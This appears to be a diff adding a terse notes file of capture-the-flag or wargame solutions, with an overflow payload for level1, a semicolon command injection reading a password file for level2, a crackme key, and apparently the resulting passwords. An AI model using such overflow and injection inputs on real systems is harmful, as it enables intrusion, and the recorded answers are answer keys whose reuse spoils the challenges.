@@ -1,0 +1,9 @@
+./level1 $(python -c 'print( "A"*20 + "\x04\x85\x04\x08")')
+=> kjdsfh
+
+./level2 ';cat /home/level3/passwd'
+dsglhn
+
+ ./crackme  YOU\>are\\a^tRuE\[1337z
+lsqfd4
+
